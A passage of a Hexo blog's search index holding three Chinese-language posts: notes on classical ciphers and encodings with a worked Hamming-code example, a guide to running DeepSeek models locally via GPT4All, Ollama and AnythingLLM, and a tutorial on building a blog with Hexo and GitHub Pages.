href="http://www.mytju.com/classcode/tools/encode_gb2312.asp">http://www.mytju.com/classcode/tools/encode_gb2312.asp</a></li><li>用2个字节16比特的16进制数表示来编码中文字符集，其中GBK是GBK2312的扩展字符集编码，包含简体、繁体中文、日语、韩语等。比如斗哥斗对应的GBK和GBK2312为B6B7。</li></ol><h1 id="列移位密码："><a href="#列移位密码：" class="headerlink" title="列移位密码："></a>列移位密码：</h1><ol><li>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。</li><li>以明文 The quick brown fox jumps over the lazy dog，以 how are u为例： 填入5行7列表(事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充)                                          <img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../../../1-笔记/crypto/密码1.assets/image-20240714153031051.png" alt="image-20240714153031051" style="zoom:67%;"></li><li>how are u 按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文： 密文：qoury inpho Tkool hbxva uwmtd cfseg erjez<br><img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714153109385.png" alt="image-20240714153109385" style="zoom:67%;"></li></ol><h1 id="卡尔达诺栅格码："><a href="#卡尔达诺栅格码：" class="headerlink" title="卡尔达诺栅格码："></a>卡尔达诺栅格码：</h1><ol><li><a href="https://www.spammimic.com/">https://www.spammimic.com/</a></li><li>把明文伪装成垃圾邮件</li></ol><h1 id="百家姓暗号："><a href="#百家姓暗号：" class="headerlink" title="百家姓暗号："></a>百家姓暗号：</h1><ol><li><a href="https://api.dujin.org/baijiaxing/">https://api.dujin.org/baijiaxing/</a>（密文转换成明文时，会多一串字符：<strong>magnet:?xt&#x3D;urn:btih:</strong>）</li><li>密文由百家姓组成</li></ol><h1 id="文本加密："><a href="#文本加密：" class="headerlink" title="文本加密："></a>文本加密：</h1><ol><li><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php">https://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></li><li>可以加密为汉字、数字、音乐符号、字母等，加密完后会有**&#x3D;&#x3D;**最为结尾，和base64类似</li></ol><h1 id="键盘密码："><a href="#键盘密码：" class="headerlink" title="键盘密码："></a>键盘密码：</h1><ol><li>应该不算是一种加密算法，但是一种有趣的设置密码方式。他就是a-z(A-Z)对应成键盘上的字母，把键盘字母一行一行的对应即可。包围的键就是要找的值。每个围起来的圈之间通常会有明显的间隔，比如空格。如：r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM</li></ol><h1 id="block-cipher-分组密码-："><a href="#block-cipher-分组密码-：" class="headerlink" title="block cipher(分组密码)："></a>block cipher(分组密码)：</h1><ol><li><a href="https://blog.csdn.net/qq_34266854/article/details/108152492">https://blog.csdn.net/qq_34266854&#x2F;article&#x2F;details&#x2F;108152492</a>（讲解）</li></ol><h1 id="核心价值观编码："><a href="#核心价值观编码：" class="headerlink" title="核心价值观编码："></a>核心价值观编码：</h1><ol><li><a href="https://ctf.bugku.com/tool/cvecode">https://ctf.bugku.com/tool/cvecode</a></li><li>由 自由，友善，公正等构成。</li></ol><h1 id="zip压缩包伪加密："><a href="#zip压缩包伪加密：" class="headerlink" title="zip压缩包伪加密："></a>zip压缩包伪加密：</h1><ol><li><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168914965716800192215326%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168914965716800192215326&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124538768-null-null.142%5Ev88%5Einsert_down28v1,239%5Ev2%5Einsert_chatgpt&utm_term=zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86&spm=1018.2226.3001.4187">https://blog.csdn.net/xiaozhaidada/article/details/124538768?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522168914965716800192215326%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;168914965716800192215326&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-2-124538768-null-null.142^v88^insert_down28v1,239^v2^insert_chatgpt&amp;utm_term&#x3D;zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BC%AA%E5%8A%A0%E5%AF%86&amp;spm&#x3D;1018.2226.3001.4187</a></li></ol><h1 id="海明校验码："><a href="#海明校验码：" class="headerlink" title="海明校验码："></a>海明校验码：</h1><ol><li>将有效信息按某种规律分成若干组，每组安排一个校验位（奇偶校验位，海明校验码的特点），做奇偶测试，就能提供多位检错信息，以指出最大可能是哪位出错，从而将其纠正。实质上，海明校验是一种多重校验。</li><li>因此如果在奇偶校验的基础上增加校验位的位数，构成多组奇偶校验，就能够发现更多位的错误并可自动纠正错误。 这就是<strong>海明校验码</strong> (Hamming Code)的实质所在。<ol><li>奇偶校验位：数据位和校验位一共含有奇数个1，称为奇校验。数据位和校验位一共含有偶数个1，称为偶校。</li><li>注：数据传输过程一般是出现一位错误，而奇偶校验码能发现奇数个错误</li><li>数据位个数+校验位个数&#x3D;总的验证码个数</li><li>校验位一般在2^n的位置</li></ol></li><li>海明校验码的使用方法：（举例，来源于buu的鸡藕椒盐味 ）<ol><li>题目：验证码：0000 0101 0011（此验证有误），数据位有8个，通过海明校验码来获得正确的验证码</li><li>因为验证码有12个、数据位有8个，所以校验位有4个（分别设为r1,r2,r3,r4）得到，而校验位在2^n的位置，所以共有4位校验码在1，2，4，8位置                                                                                <img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714153307893-1721657608574-22.png" alt="image-20240714153307893"></li><li>求校验码r1、r2、r3、r4的值： <ol><li>首先列表：                                                                                                                       <img src="/2025/03/01/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0/../图片/密码笔记.assets/image-20240714153336761.png" alt="image-20240714153336761" style="zoom:80%;">                                                                                                               规则：第2列：校验码对应的序号之和等于第一列同行序号。第3列：第2列序号对应的校验位</li><li>其次由表得出：我们会发现r1在序号为1、3、5、7、9、11的行出现，然后又因为序号1对应的是校验位，所以最后统计出来r1所在的数据位有3、5、7、9、11。将所有校验位统计后得到下表：                                                                                                                 <img src="/../%E5%9B%BE%E7%89%87/%E5%AF%86%E7%A0%81%E7%AC%94%E8%AE%B0.assets/image-20240714153416514-1721657619157-24.png" alt="image-20240714153416514">          </li><li>r1等校验位的计算要用到异或(⊕)，那么应有：r1&#x3D;0⊕1⊕1⊕0⊕1&#x3D;1；r2&#x3D;0⊕0⊕1⊕0⊕1&#x3D;0；r3&#x3D;1⊕0⊕1⊕0&#x3D;0；r4&#x3D;0⊕0⊕1⊕1&#x3D;0</li><li>明显r1出现错误，与题目所给的r1&#x3D;0不符，所依通过计算比对（改变一个数据位的值，让r1&#x3D;0，r2、r3、r4的值不变）我们可知，9的位置出现错误，应该为1（奇偶校验码，奇数个错误，一般数据传输有一位错误，所以可以确定9出现错误）    </li><li>最终我们可得正确的验证码:0000 0101 1011</li></ol></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部署本地deepseek</title>
      <link href="/2025/03/01/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek/"/>
      <url>/2025/03/01/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek/</url>
      
        <content type="html"><![CDATA[<ol><li>感觉GPT4All用起来比ollama要流畅一些，同时GPT4All在界面的功能比ollama多，因为ollama是命令行工具，图形化界面可以通过page assist来实现的。</li><li>使用ai模型推荐GPT4All，如果是开发ai模型推荐ollama</li><li>GPT4All支持上传文件，但是文件类型有限，仅支持md、图片等少量类型，docx和pdf都不支持；至于page assist就支持的类型最少，但page assist支持联网搜索</li><li>下载电脑配置模型的大小的判断标准，主要有两种说法：一种是通过显存判断，7B需要4G的显存，一种是通过RAM+VRAM的大小大于模型文件1到2G即可，如果要高效率的问答则VRAM要大于模型的1到2G</li><li>功能上AnythingLLM &gt; GPT4All &gt; ollama  </li><li>anythingLLM、GPT4All支持gguf文件，ollama可以转换gguf文件为自己支持的二进制文件</li><li>anythingLLM支持本地知识库，直接在工作区上传文件即可，如果想避免ai出现‘幻觉’，可以选择查询模式</li></ol><h1 id="通过GPT4All部署deepseek"><a href="#通过GPT4All部署deepseek" class="headerlink" title="通过GPT4All部署deepseek"></a>通过GPT4All部署deepseek</h1><ol><li>下载GPT4All。<a href="https://www.nomic.ai/gpt4all">GPT4All (官网)</a>或<a href="https://github.com/nomic-ai/gpt4all">GPT4All(github.com)</a></li><li>安装。初始界面时，左下角有一个设置，设置里有一个目录可以改（是关于远程仓库的），他原本是在Cpan，可以清除缓存后改在D盘。</li><li>软件的安装目录也可以改在D盘</li><li>模型下载方法：<ol><li>第一种：在软件内下载<ol><li>软件中ai模型的默认安装目录也是在C盘，可以改在D盘。下载目录在软件的设置的应用里面<img src="/2025/03/01/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek/../图片/部署本地deepseek.assets/image-20250207153147607.png" alt="image-20250207153147607" style="zoom:48%;"></li><li>ai模型可以在模型里面找，软件中会显示不同模型的大小和配置要求，你的电脑配置不足的他会红色提示<img src="/2025/03/01/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek/../图片/部署本地deepseek.assets/image-20250207153427888.png" alt="image-20250207153427888" style="zoom:48%;"></li><li>也可以在huggingface里面搜索模型下载。</li><li>但是不知道为什么我在GPT4All中下载模型会自动卡住，下载一点就会自动卡住无法继续下载，要取消下载后关闭GPT4All再重启后，再点击继续下载有才只能下载一点</li></ol></li><li>第二种：在huggingface官网下载<ol><li>所以第二种下载方法，直接在huggingface里面下载，GPT4All支持的ai模型文件格式有gguf，还有没有其他格式我就不太清楚了。<a href="https://huggingface.co/bartowski/DeepSeek-R1-Distill-Qwen-7B-GGUF/tree/main">deepseek-r1:7b（huggingface）</a>，huggingface在google打开页面格式才是正常的，可以用使用搜索功能</li><li>将下载好的文件放在模型的下载目录即可</li></ol></li></ol></li></ol><h1 id="通过ollama部署deepseek"><a href="#通过ollama部署deepseek" class="headerlink" title="通过ollama部署deepseek"></a>通过ollama部署deepseek</h1><ol><li><p>下载ollama。<a href="https://ollama.com/">Ollama</a></p></li><li><p>安装ollama（会自动安装在c盘，目录：C:\Users&lt;你的用户名&gt;\ollama）</p></li><li><p>在命令提示符中输入命令<code>ollama run deepseek-r1:7b</code>。因为我下的是deepseek-r1:7b，所以就是这个，如果是下载其他的就换成其他的模型的名称，但要注意自己电脑的显存和运行内存够不够</p></li><li><p>下载模型时不要开加速器</p></li><li><p>如果下载到最后百分之几时出现速度很慢只有几十几百KB时，可以选择<code>Ctrl+c</code>中断下载，重新输入下载命令，ollama会接着之前的下载进度继续下载同时速度也会恢复正常，只有很小的概率会重新下载（我没遇到，网上有人说遇到了）</p></li><li><p>因为ollama下载模型时的默认安装路径是C:\Users&lt;username&gt;.ollama\models，可以修改模型存放位置</p><ol><li><p>打开环境变量编辑界面。可以通过以下方式：</p><ol><li><p>右键点击“此电脑”或“我的电脑”，选择“属性”。</p></li><li><p>在系统窗口中选择“高级系统设置”。</p></li><li><p>在系统属性窗口中点击“环境变量”按钮。</p></li></ol></li><li><p>在环境变量窗口中，点击“新建”创建一个新的系统变量或用户变量。</p><ol><li>变量名：OLLAMA_MODELS</li><li>变量值：输入你希望设置的新模型存放路径，例如：D:\Ollama\Models</li><li>点击“确定”保存设置。</li></ol></li><li><p>重启任何已经打开的Ollama相关应用程序，以便新的路径生效。</p></li></ol></li><li><p>ollama是命令行的工具，同时可以接入pycharm的插件（codeGPT使用本地ollama中的模型）</p></li><li><p>因为ollama只有命令行窗口，所以可以通过google的插件page assist实现web ui端窗口。在配置page assist中，除了开始页面要选择对应模型外，在设置的RAG设置的Embedding Model也要选择对应模型</p><img src="/2025/03/01/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek/../图片/部署本地deepseek.assets/image-20250207152253929.png" alt="image-20250207152253929" style="zoom:48%;"></li><li><p>将gguf文件导入ollama中：<a href="https://blog.csdn.net/weixin_46241866/article/details/144700025">Ollama手动导入GGUF模型文件_ollama导入gguf模型-CSDN博客</a></p></li></ol><h1 id="通过AnythingLLM部署deepseek"><a href="#通过AnythingLLM部署deepseek" class="headerlink" title="通过AnythingLLM部署deepseek"></a>通过AnythingLLM部署deepseek</h1><p><a href="https://zhuanlan.zhihu.com/p/21427971294">AnythingLLM本地知识库避坑指南+配置攻略 - 知乎 (zhihu.com)</a></p><ol><li>下载<a href="https://anythingllm.com/">AnythingLLM | The all-in-one AI application for everyone</a>，可以安装在D盘。</li><li>安装AnythingLLM时，如果没有安装ollama，会下载并安装ollama，此时如果不挂加速器会下载出问题。这时ollama会部署在AnythingLLM软件文件夹里面。也可以先安装ollama后再安装AnythingLLM，那么在安装AnythingLLM时就不会再次下载ollama了，如果没检查到系统下载了ollama，可以手动将ollama下载的窗口关闭。感觉单独下载ollama的情况下，模型的运行效果会好一些</li><li>导入模型在设置中按照图片的标号选择，上传文件后一定要点击save changs<img src="/../%E5%9B%BE%E7%89%87/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek.assets/image-20250208104425684.png" alt="image-20250208104425684"></li><li>进入后创建一个工作区，然后配置工作区，选择聊天设置，LLM提供者选择ollama（我用的时候感觉相同模型下，ollama比AnythingLLM自带的provider部署出来的ai好用），模型选择自己下载的模型（我的模型通过huggingface下载的guff文件，然后放在了AnythingLLM文件夹里面，它自己就扫出来了），配置好后一定要点击最下方的update workspace才能更新配置<img src="/../%E5%9B%BE%E7%89%87/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek.assets/image-20250208103415302.png" alt="image-20250208103415302"><img src="/../%E5%9B%BE%E7%89%87/%E9%83%A8%E7%BD%B2%E6%9C%AC%E5%9C%B0deepseek.assets/image-20250208103506833.png" alt="image-20250208103506833"></li><li>AnythingLLM的anythingllm-desktop文件夹通常存放与 AnythingLLM 应用相关的信息，而anythingllm-desktop文件夹的默认路径：”C:\Users\上善若水\AppData\Roaming\anythingllm-desktop”。<ol><li>这些信息可能包括，<ol><li><strong>模型文件</strong>：存储所有下载和使用的 AI 模型。</li><li><strong>配置文件</strong>：包含应用的配置和设置，例如模型路径、用户偏好等。</li><li><strong>数据库文件</strong>：存储应用的内部数据，例如用户输入、生成的响应等。</li><li><strong>日志文件</strong>：记录应用的运行日志和调试信息。</li></ol></li><li>如果想将文件夹移到D盘存储，可以通过下面的操作：<ol><li>将anythingllm-desktop文件夹移到D盘目录下”D:\AnythingLLM\anythingllm-desktop”</li><li>通过管理员身份调用命令提示符，输入命令<code>mklink /D &quot;C:\Users\上善若水\AppData\Roaming\anythingllm-desktop&quot; &quot;D:\AnythingLLM\anythingllm-desktop&quot;</code></li><li>该操作建立了一个符号链接</li></ol></li><li>如果想要还原：<ol><li>现在原本的目录中创建一个空的相同命名的文件夹，即在”C:\Users\上善若水\AppData\Roaming”中创建anythingllm-desktop的空文件夹</li><li>输入命令<code>rmdir &quot;C:\Users\上善若水\AppData\Roaming\anythingllm-desktop&quot;</code></li><li>再将原本的anythingllm-desktop文件夹移回原本的目录下”C:\Users\上善若水\AppData\Roaming\anythingllm-desktop”即可。</li></ol></li></ol></li></ol><h1 id="chatbox"><a href="#chatbox" class="headerlink" title="chatbox"></a>chatbox</h1><ol><li><a href="https://chatboxai.app/zh">Chatbox AI官网：办公学习的AI好助手，全平台AI客户端，官方免费下载</a></li><li>可以调用api和本地模型，如果是ollama，在选择模型的时候选择ollama即可，他会自动接入找到ollama中的模型。记得运行ollama</li></ol>]]></content>
      
      
      <categories>
          
          <category> ai </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deepseek </tag>
            
            <tag> 本地部署 </tag>
            
            <tag> ai大模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建个人博客</title>
      <link href="/2025/03/01/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2025/03/01/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎 (zhihu.com)</a></p><h1 id="下载并配置hexo"><a href="#下载并配置hexo" class="headerlink" title="下载并配置hexo"></a>下载并配置hexo</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><code>npm install -g hexo-cli</code></p><h2 id="Hexo初始化和本地预览"><a href="#Hexo初始化和本地预览" class="headerlink" title="Hexo初始化和本地预览"></a>Hexo初始化和本地预览</h2><ol><li>创建博客的本地文件夹</li><li>在文件夹中运行命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">初始化并安装所需组件：</span><br><span class="line">hexo init      # 初始化</span><br><span class="line">npm install    # 安装组件</span><br><span class="line"></span><br><span class="line">完成后依次输入下面命令，启动本地服务器进行预览：</span><br><span class="line">hexo g   # 生成页面</span><br><span class="line">hexo s   # 启动预览</span><br></pre></td></tr></table></figure><h2 id="Hexo博客文件夹目录结构"><a href="#Hexo博客文件夹目录结构" class="headerlink" title="Hexo博客文件夹目录结构"></a>Hexo博客文件夹目录结构</h2><blockquote><p>.</p><p>├── .deploy<br>├── public<br>├── source<br>│   ├── _posts      &#x2F;&#x2F; 存放文章的文件夹<br>│   ├── about       &#x2F;&#x2F; 存放关于页面的文件夹<br>│   ├── categories  &#x2F;&#x2F; 存放分类页面的文件夹<br>│   ├── tags        &#x2F;&#x2F; 存放标签页面的文件夹<br>│   └── themes      &#x2F;&#x2F; 存放主题的文件夹<br>├── themes          &#x2F;&#x2F; 主题文件夹<br>│   ├── landscape    &#x2F;&#x2F; 默认主题文件夹<br>│   │   ├── layout<br>│   │   ├── scripts<br>│   │   ├── source<br>│   │   └── …<br>│   └── your_theme    &#x2F;&#x2F; 自定义主题文件夹<br>├── _config.yml     &#x2F;&#x2F; Hexo 配置文件<br>├── package.json    &#x2F;&#x2F; 包管理文件<br>└── scaffolds       &#x2F;&#x2F; 模板文件夹</p></blockquote><h1 id="创建GitHub仓库"><a href="#创建GitHub仓库" class="headerlink" title="创建GitHub仓库"></a>创建GitHub仓库</h1><p>Repository name 中输入 <code>likwater.github.io</code>。选择public<img src="/../%E5%9B%BE%E7%89%87/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2.assets/image-20250228223719821-1740809862600-1.png" alt="image-20250228223719821-1740809862600-1"></p><h1 id="部署-Hexo-到-GitHub-Pages"><a href="#部署-Hexo-到-GitHub-Pages" class="headerlink" title="部署 Hexo 到 GitHub Pages"></a>部署 Hexo 到 GitHub Pages</h1><h2 id="安装-hexo-deployer-git"><a href="#安装-hexo-deployer-git" class="headerlink" title="安装 hexo-deployer-git"></a>安装 hexo-deployer-git</h2><p>在博客的本地文件夹中打开git bash，输入命令<code>npm install hexo-deployer-git --save</code></p><h2 id="修改-config-yml"><a href="#修改-config-yml" class="headerlink" title="修改 _config.yml"></a>修改 _config.yml</h2><p>然后修改 _config.yml文件末尾的 Deployment 部分，修改成如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:likwater/likwater.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h2 id="将网站上传部署到-GitHub-Pages"><a href="#将网站上传部署到-GitHub-Pages" class="headerlink" title="将网站上传部署到 GitHub Pages"></a>将网站上传部署到 GitHub Pages</h2><p>输入命令<code>hexo d</code></p><h1 id="访问博客"><a href="#访问博客" class="headerlink" title="访问博客"></a>访问博客</h1><p><a href="https://likwater.github.io/">https://likwater.github.io/</a></p><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><h3 id="命令行创建"><a href="#命令行创建" class="headerlink" title="命令行创建"></a>命令行创建</h3><ol><li>在博客本地文件夹目录打开git bash，输入命令<code>hexo new &quot;文件名&quot;</code>，然后 source 文件夹中会出现一个 对应文件名的.md 文件，就可以使用 Markdown 编辑器在该文件中撰写文章了。命令行生成会有部分文章信息</li></ol><h3 id="手动创建"><a href="#手动创建" class="headerlink" title="手动创建"></a>手动创建</h3><p>也可以不使用命令自己创建 .md 文件，只需在文件开头手动加入如下格式 Front-matter 即可，写完后运行 <code>hexo g</code> 和 <code>hexo d</code> 发布。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World # 标题</span><br><span class="line">date: 2019/3/26 hh:mm:ss # 时间</span><br><span class="line">categories: # 分类</span><br><span class="line">- Diary</span><br><span class="line">tags: # 标签</span><br><span class="line">- PS3</span><br><span class="line">- Games</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">摘要</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">正文</span><br></pre></td></tr></table></figure><h3 id="文章信息模板"><a href="#文章信息模板" class="headerlink" title="文章信息模板"></a>文章信息模板</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: </span><br><span class="line">author: catsky</span><br><span class="line">cover: &#x27;&#x27; #封面</span><br><span class="line">categories:</span><br><span class="line">  - </span><br><span class="line">tags:</span><br><span class="line">  - </span><br><span class="line">date: YYYY-MM-DD HH:MM:SS</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="上传文章"><a href="#上传文章" class="headerlink" title="上传文章"></a>上传文章</h3><ol><li>写完后运行下面代码将文章渲染并部署到 GitHub Pages 上完成发布。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">以后每次发布文章都是这几条命令。</span><br><span class="line"># 清除缓存（可选）</span><br><span class="line"># 重新生成</span><br><span class="line"># 部署</span><br><span class="line"></span><br><span class="line">hexo clean  </span><br><span class="line">hexo g      </span><br><span class="line">hexo d     </span><br></pre></td></tr></table></figure><h2 id="网站设置"><a href="#网站设置" class="headerlink" title="网站设置"></a>网站设置</h2><p>包括网站名称、描述、作者、链接样式等，全部在网站目录下的 _config.yml 文件中，参考<a href="https://hexo.io/zh-cn/docs/configuration">配置 | Hexo</a>按需要编辑。</p><p><strong>注意：冒号后要加一个空格！</strong></p><h2 id="更换主题配置博客"><a href="#更换主题配置博客" class="headerlink" title="更换主题配置博客"></a>更换主题配置博客</h2><p>在<a href="https://hexo.io/themes/">Themes | Hexo</a>选择一个喜欢的主题，比如<a href="https://butterfly.js.org/posts/21cfbf15/">Butterfly 文檔(一) 快速開始 | Butterfly</a>，<a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">【Hexo】Hexo搭建Butterfly主题并快速美化_hexo butterfly-CSDN博客</a></p><p><strong>注意：在设置分类和标签页面时，在通过命令：<code>hexo new page categories</code>和<code>hexo new page tags</code>生成页面后，要打开对应的index.md文件，在文件中添加：type: “categories”和type: “tags”</strong></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;name&quot;       # 新建文章</span><br><span class="line">hexo new page &quot;name&quot;  # 新建页面</span><br><span class="line">hexo g                # 生成页面</span><br><span class="line">hexo d                # 部署</span><br><span class="line">hexo g -d             # 生成页面并部署</span><br><span class="line">hexo s                # 本地预览</span><br><span class="line">hexo clean            # 清除缓存和已生成的静态文件</span><br><span class="line">hexo help             # 帮助</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
